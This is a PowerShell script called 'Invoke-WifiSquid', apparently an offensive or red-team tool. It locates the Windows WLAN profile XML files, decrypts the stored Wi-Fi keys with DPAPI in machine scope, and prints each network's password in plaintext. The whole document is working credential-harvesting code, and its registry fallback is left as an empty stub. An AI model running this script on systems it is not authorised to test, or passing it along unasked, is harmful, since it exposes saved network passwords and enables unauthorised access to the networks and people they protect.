# FUNCTION TO CONVERT A HEX STRING OF FORMAT "FF0A0B0C12" INTO A BYTE ARRAY
Add-type -AssemblyName System.Security;
Add-type -AssemblyName System.Text.Encoding;

# CLASS FOR NETWORK
class WifiNetwork {
    [string] $GUID
    [string] $SSID 
    [string] $DecryptedKey
    [string] $KeyType
    [string] $KeyMaterial
    [string] $IsProtected
}

# STORE NETWORKS
[WifiNetwork[]] $foundNetworks = @();
[WifiNetwork[]] $notFoundNetworks = @();

Write-Host @"

                        ___
                    .-'   ``'.
                    /         \
                    |         ;
                    |         |           ___.--,
           _.._     |0) ~ (0) |    _.---'``__.-( (_.
    __.--'``_.. '.__.\    '--. \_.-' ,.--'``     ``""``
   ( ,.--'``   ',__ /./;   ;, '.__.'``    __
  _``) )  .---.__.' / |   |\   \__..--""  """--.,_
``---' .'.''-._.-'``_./  /\ '.  \ _.-~~~````````~~~-._``-.__.'
       | |  .' _.-' |  |  \  \  '.               ``~---``
       \ \/ .'      \  \   '. '-._)
        \/ /         \  \    ``=.__``~-.
        / /\         ``) )    / / ``"".``\
   , _.-'.'\ \       / /    ( (     / /
  ``--~``   ) )     .-'.'      '.'.  | (
           (/``    ( (``          ) )  '-;
            ``      '-;         (-'

"@;
Write-Host "Invoke-WifiSquid by @0xblacklight`n";

# GRAB THE WIFI CONFIG XML FILES AND LOOP OVER THEM. SUPPY DIRECTORY NAME IN VARIABLE
# TODO: ALLOW COMMAND LINE ARG TO SPECIFY 
$dirName = "C:\programdata\Microsoft\Wlansvc\Profiles\Interfaces" # INTERFACES LIST

# FIND INTERFACE DIRECTORIES
$ifaceFolders = Get-ChildItem $dirName;
for ($i = 0; $i -lt $ifaceFolders.Count; $i++) {

    $fullPathToConfigs = "$($dirName)\$($ifaceFolders[$i])";
    Write-Host "Found full path to interface folder: $($fullPathToConfigs)`n";

    # FIND XML FILES
    Write-Host "Found XML Files:";
    $networkConfigs = Get-ChildItem $fullPathToConfigs;

    # LOOP THROUGH NETWORK CONFIGS IN WINDOWS DIR
    for ($j = 0; $j -lt $networkConfigs.Count; $j++) {

        $fullPathToConfig = "$($fullPathToConfigs)\$($networkConfigs[$j])"
        Write-Host "`t$($networkConfigs[$j])";

        $network = [WifiNetwork]::new();

        # PARSE XML AND GET THE CONFIG
        [xml]$wifiConfig = Get-Content $fullPathToConfig;
        $pattern = '(?<=\{).+?(?=\})'
        $network.GUID = [regex]::Matches($networkConfigs[$j], $pattern).Value
        $network.SSID = $wifiConfig.WLANProfile.name;
        $network.KeyType = $wifiConfig.WLANProfile.MSM.security.sharedKey.keyType;
        $network.IsProtected = $wifiConfig.WLANProfile.MSM.security.sharedKey.protected;
        $network.KeyMaterial = $wifiConfig.WLANProfile.MSM.security.sharedKey.keyMaterial;

        # IF THERE'S KEY MATERIAL, THEN DECRYPT IT AND ADD IT TO FOUND ONES. OTHERWISE, ADD IT TO THE LIST OF NOT FOUND ONES THAT WE'LL COME BACK TO 
        if ($network.KeyMaterial) {
            $keyBytes = [byte[]] ($network.KeyMaterial -replace '^0x' -split '(..)' -ne '' -replace '^', '0x');
            try {
                $decryptedNetworkKeyBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes,$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine);
                $network.DecryptedKey =  [System.Text.Encoding]::UTF8.GetString($decryptedNetworkKeyBytes);
            } catch [System.Security.Cryptography.CryptographicException] {
                #Write-Host "`t`tAn error occurred for network $($network.SSID) ($($network.GUID)): $($_)";
            }
            
            $foundNetworks += $network;
        } else {
            $notFoundNetworks += $network
        }
    }

    # NOW, FOR ANY NETWORKS WE COULDN'T FIND KEYS FOR, LET'S GO THROUGH THE REGISTRY AND LOOK FOR THEM
    for ($a = 0; $a -lt $notFoundNetworks.Count; $a++) {

    }

    # PRINT THE NETWORKS WE FOUND
    
    for ($a = 0; $a -lt $foundNetworks.Count; $a++) {
        [WifiNetwork] $network = $foundNetworks[$a]
        Write-Host "Got key for network: $($network.SSID): $($network.DecryptedKey)";
    }
    Write-Host "";
    for ($a = 0; $a -lt $notFoundNetworks.Count; $a++) {
        [WifiNetwork] $network = $notFoundNetworks[$a]
        Write-Host "Failed to get key for network $($network.SSID) :(";
    }



}